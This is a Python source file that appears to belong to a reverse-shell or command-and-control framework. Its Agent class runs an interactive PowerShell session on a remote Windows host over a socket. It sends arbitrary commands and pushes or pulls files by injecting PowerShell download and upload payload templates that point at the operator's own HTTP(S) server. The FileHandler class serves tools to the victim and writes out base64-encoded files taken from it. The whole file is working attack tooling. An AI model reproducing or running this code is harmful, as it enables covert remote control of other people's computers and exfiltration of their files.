from .handle_agent import *
from .common import *
from .settings import HTTPFileServerSettings
from .logging import AutoComplete
from .payloads import powershell_download_file, powershell_upload_file, powershell_upload_file_ssl, powershell_download_file_ssl

from http.server import BaseHTTPRequestHandler
from base64 import b64decode
from tqdm import tqdm
import socket, os, re, time



class Agent:
    
    def __init__(self, conn, user):
        
        self.path = None
        self.conn         = conn
        self.user         = user
        self.buff         = 4096
        self.session_id   = None
        self.invalid_commands = ["ping"]

    
    def receive_all(self):
        
        data = b''
        
        while True:
            
            buff = self.conn.recv(self.buff)
            
            if not buff:
                break
            data += buff
            
            if len(buff) < self.buff:
                break
            
        return data.decode('utf-8')
    
        
    def close_shell(self):
        
        self.conn = None
        self.user = None

        print(Message.shellClosed)


    def create_path(self, response):

        valid_path = re.search(r'([A-Za-z]:\\[^>\n]*>)', response)
        if valid_path:
            return valid_path.group(1)



    def init_path(self):
        
        self.conn.send("whoami".encode('utf-8'))
        response = self.conn.recv(self.buff).decode("utf-8")
        
        self.path = self.create_path(response)
        time.sleep(0.2)
    
        
    def remove_path(self, response):
        
        if self.path is not None:
            return response.replace(self.path, '').replace('>', '').strip()
        
        else:
            return response.replace('>', '').strip()
    
    
    def update_session_commands(self, command_executed, command_output):
        
        commands = command_executed.split()
        for command in commands:
            if command not in command_output:
                command_output.append(command)
    
        for command in command_output:
            if command not in AutoComplete.sessionsCommands:
                AutoComplete.sessionsCommands.append(command)
                                    
         
    def get_file_names(self, response):

        pattern = r'([-\w]+(?:\.\w+)?)(?=\s{2,})'
        matches = re.findall(pattern, response)
        
        file_names = sorted(set(match for match in matches if len(match) > 3 and not re.fullmatch(r'-+', match)), key=lambda x: response.index(x))
        
        return file_names

    
    def send_command(self, command):
        
        try:
            
            self.conn.send(command.encode('utf-8'))
        
        except socket.timeout:
            
            print(f"\n{c.alt} Connection timeout")
            self.close_shell()

                
    def shell(self):
                
        print(f"\n{c.add} Interactive shell activated\n{c.info} Type 'exit' or press 'CTRL+C' to deactivate\n")
        self.init_path()
        
        while True:   
            
            try:
                
                command  = input(f"PS {self.path} ")
                command_args = command.split()
                
                if len(command_args) == 0:
                    continue
    
                main_arg = command_args[0].strip().lower()
                
                if main_arg == "exit":
                    
                    self.close_shell()
                    break
                
                elif main_arg in self.invalid_commands:
                    
                    confirm = input(f"\n{c.alt} This command can interrupt shell function, execute anyway (y/n): ")
                    
                    if confirm in ["y", "yes"]:
                        continue
                    
                    else:
                        continue
                
                elif len(main_arg) == 0:
                    continue
                
                elif main_arg == "clear":
                    clear_screen()
                    
                elif main_arg == "upload":
                    
                    args = command.split()
                    
                    if len(args) < 3:
                        
                        print(f"\n{c.alt} Missing <file path> <target path> arguments\n")
                        continue
                    
                    else:
                        
                        local_path = args[1].strip()
                        upload_path = args[2].strip()
                    
                        self.upload_file(local_path, upload_path)
            
                        
                elif main_arg == "download":
                    
                    args = command.split()
                    
                    if len(args) < 2:
                        print(f"\n{c.alt} Missing <file path> argument\n")
                        continue
                    
                    else:
                        file_path = args[1].strip()
                        
                        self.downloadFile(file_path)

                else:

                    try:
                        
                        self.send_command(command)
                        response = self.receive_all()
                                        
                        self.path = self.create_path(response)
                        response = self.remove_path(response)
                                                       
                        file_names = self.get_file_names(response)
                        
                        self.update_session_commands(command, file_names)
                
                        print(f"{c.G}{response}{c.RS}")

                    except Exception as e:

                        print(f"\n{c.alt} An error occurred while executing command")
                        print(f"{c.alt} {e}")
                        self.close_shell()
                        break


            except KeyboardInterrupt:
                
                print("\n")
                self.close_shell()
                break
            
    def file_path_exists(self, file_path):
                
        check_file_path = f"Test-Path -Path {file_path}"
        
        self.send_command(check_file_path)
        is_path_exist = self.receive_all()
        is_path_exist = self.remove_path(is_path_exist)
        
        if is_path_exist == "True":

            return True
        
        else:
            return False
                

                    
    def upload_file(self, local_path, upload_path):
        
        lhost = self.get_ip()
        protocol = "http"
        
        
        if HTTPFileServerSettings.SSL:
            
            protocol = "https"
            upload_payload = powershell_upload_file_ssl.Payload.template
            
        else:
            
            upload_payload = powershell_upload_file.Payload.template
            
            
        if os.path.exists(local_path):
                        
            local_file_name = os.path.basename(local_path)
            
            if upload_path[-1] != "/" and upload_path[-1] != "\\":
                upload_path = upload_path + "\\"
                
            upload_file_name = os.path.basename(upload_path.replace("\\", "/"))
            
            if upload_file_name == "":
                upload_file_name = local_file_name

            upload_path = upload_path.replace(upload_file_name, '')

            if self.file_path_exists(upload_path):
                                
                upload_path += upload_file_name
                
                server_url = f"{protocol}://{lhost}:{HTTPFileServerSettings.bind_port}/{local_file_name}"
                
                upload_payload = upload_payload.replace("SERVERURL", server_url)
                upload_payload = upload_payload.replace("TARGETPATH", upload_path)
                                
                FileHandler.filePath = local_path
            
                try:
                    
                    self.send_command(upload_payload)
                    self.receive_all()
                    print(f"{c.add} File successfully uploaded\n")

                except ConnectionError:

                    print(f"\n{c.alt} Failed to upload file\n")
                    
            else:
                print(f'\n{c.alt} Upload path "{c.Y}{upload_path}{c.RS}" not found\n')
                return
        
        else:
            print(f'\n{c.alt} File "{c.Y}{local_path}{c.RS}" not found\n')
            return 
                
                

    def get_ip(self):
        
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        socket_obj.connect(("8.8.8.8", 80))
        return socket_obj.getsockname()[0]
            

    def downloadFile(self, file_path):
        
        lhost = self.get_ip()
        protocol = "http"
        
        check_file_path = f"Test-Path -Path {file_path}"
        
        if HTTPFileServerSettings.SSL:  
               
            download_payload = powershell_download_file_ssl.Payload.template
            protocol = "https"
            
        else:
            download_payload = powershell_download_file.Payload.template
            
            
        self.send_command(check_file_path)
        is_file_exist = self.receive_all()
        is_file_exist = self.remove_path(is_file_exist)
        
        if is_file_exist == "True":
            
            if "/" not in file_path and "\\" not in file_path:
                file_path = self.path.replace(">", "") + "\\" + file_path
                
            file_name = os.path.basename(file_path.replace("\\", "/"))
                            
            server_url = f"{protocol}://{lhost}:{HTTPFileServerSettings.bind_port}/{file_name}"
            download_payload = download_payload.replace("SERVERURL", server_url)
            download_payload = download_payload.replace("FILEPATH", file_path)
                                                        
            try:  
                    
                self.send_command(download_payload)
                self.receive_all()
                
                print(f"{c.add} File successfully downloaded\n")

            except ConnectionError:
                
                print(f"\n{c.alt} Failed to download file\n")
           
            
        else:
            print(f'\n{c.alt} File "{c.Y}{file_path}{c.RS}" not found\n')
            
            
    

class FileHandler(BaseHTTPRequestHandler):
    
    filePath = "" 
    
    def do_GET(self):

        try:
            
            with open(self.filePath, 'rb') as file:
                
                file_size = os.path.getsize(self.filePath)
                file_name = os.path.basename(self.filePath)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(self.filePath)}"')
                self.end_headers()
                
                print("")
                pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"{c.add} Uploading {c.G}{file_name}{c.RS}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')
                
                for data in iter(lambda: file.read(1024), b''):
                    
                    self.wfile.write(data)
                    pr_bar.update(len(data))

                pr_bar.close()
                    
        except FileNotFoundError:

            print(f"\n{c.alt} File not found: {c.Y}{self.filePath}{c.RS}")
            self.send_error(404, 'File Not Found: %s' % self.path)
            

    def do_POST(self):
                   
        file_name = os.path.basename(self.path)
        file_size = int(self.headers['Content-Length'])
                    
        print("")                   
        pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Downloading {c.G}{file_name}{c.RS}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')
                    
        with open(file_name, 'wb') as f:
            
            for byte in range(0, file_size, 1024):
                
                data = self.rfile.read(min(1024, file_size - byte))
                pr_bar.update(len(data))
                data = b64decode(data)
                f.write(data)
        
        pr_bar.close()
                    
        self.send_response(200)
        self.end_headers()

                 

    def log_message(self, format, *args):
        return

